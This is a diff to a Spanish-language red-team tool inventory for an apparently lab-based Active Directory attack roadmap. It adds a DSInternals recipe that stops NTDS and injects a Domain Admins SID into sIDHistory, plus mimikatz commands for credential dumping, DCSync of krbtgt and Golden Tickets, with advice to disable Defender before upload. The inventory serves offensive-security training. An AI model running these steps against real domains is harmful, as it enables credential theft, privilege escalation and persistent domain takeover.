@@ -2,6 +2,7 @@
 
 > Documentación de todas las herramientas instaladas y utilizadas durante la realización del roadmap.  
 > Organizado por categoría funcional, con descripción técnica, uso principal y lab de referencia.
+> **Versión:** 2.1 | **Actualizado:** Junio 2026
 
 ---
 
@@ -216,9 +217,34 @@
 ---
 
 ### bloodyAD
-- **Descripción:** Herramienta Python para abuso de ACLs AD — GenericWrite, WriteDACL, ForceChangePassword.
-- **Instalación:** `pip install bloodyad --break-system-packages`
-- **Labs:** Lab-01, Lab-04, Lab-05
+- **Descripción:** Herramienta Python para abuso de ACLs AD — GenericWrite, WriteDACL, ForceChangePassword, manipulación LDAP remota.
+- **Versión:** 2.5.4 (Junio 2026)
+- **Instalación:** `sudo apt install bloodyad` (recomendado sobre pip — versión más reciente)
+- **Nota v2.5.4:** El subcomando `add sidHistory` fue eliminado. El atributo `sIDHistory` está protegido en AD y no puede modificarse via LDAP aunque se sea DA. Usar DSInternals para SID History injection.
+- **Labs:** Lab-01, Lab-04, Lab-05, Lab-06
+
+---
+
+### DSInternals
+- **Descripción:** Módulo PowerShell para manipulación directa de la base de datos NTDS (ntds.dit). Permite modificar atributos AD protegidos que no son accesibles via LDAP, incluyendo `sIDHistory`.
+- **Versión:** 4.14
+- **Ruta:** `/opt/redteam/windows/DSInternals_module.zip` (subir a DC via Evil-WinRM)
+- **Uso:**
+  ```powershell
+  # Subir desde Kali via Evil-WinRM
+  upload /opt/redteam/windows/DSInternals_module.zip
+
+  # En DC (requiere Stop NTDS)
+  Expand-Archive .\DSInternals_module.zip -DestinationPath C:\Temp\DSInternals\
+  Stop-Service NTDS -Force
+  Import-Module C:\Temp\DSInternals\DSInternals\DSInternals\DSInternals.psd1
+  Add-ADDBSidHistory -SamAccountName child.user \
+      -SidHistory 'S-1-5-21-...-512' \
+      -DBPath 'C:\Windows\NTDS\ntds.dit' -Force
+  Start-Service NTDS
+  ```
+- **OPSEC:** Parar NTDS genera ~30s de interrupción AD — genera alertas en producción.
+- **Labs:** Lab-06+
 
 ---
 
@@ -334,6 +360,23 @@
 ---
 
 ## 🥷 Evasión y Ejecución en Memoria
+
+### mimikatz
+- **Descripción:** Herramienta de post-explotación Windows para volcado de credenciales en memoria, manipulación de tickets Kerberos y operaciones AD.
+- **Versión:** 2.2.0 (incluida en Kali en `/usr/share/windows-resources/mimikatz/x64/`)
+- **Ruta arsenal:** `/opt/redteam/windows/mimikatz.exe`
+- **Uso principal:**
+  ```
+  privilege::debug
+  sekurlsa::logonpasswords    ← credenciales en memoria
+  lsadump::dcsync /user:krbtgt ← DCSync
+  kerberos::golden            ← Golden Ticket
+  ```
+- **Nota v2.1:** `misc::addsid` fue eliminado en v2.2.0+. Para SID History usar DSInternals.
+- **Defender:** Bloqueado inmediatamente — deshabilitar real-time monitoring antes de subir.
+- **Labs:** Lab-01, Lab-06+
+
+---
 
 ### AMSI Bypass
 - **Técnicas documentadas:**
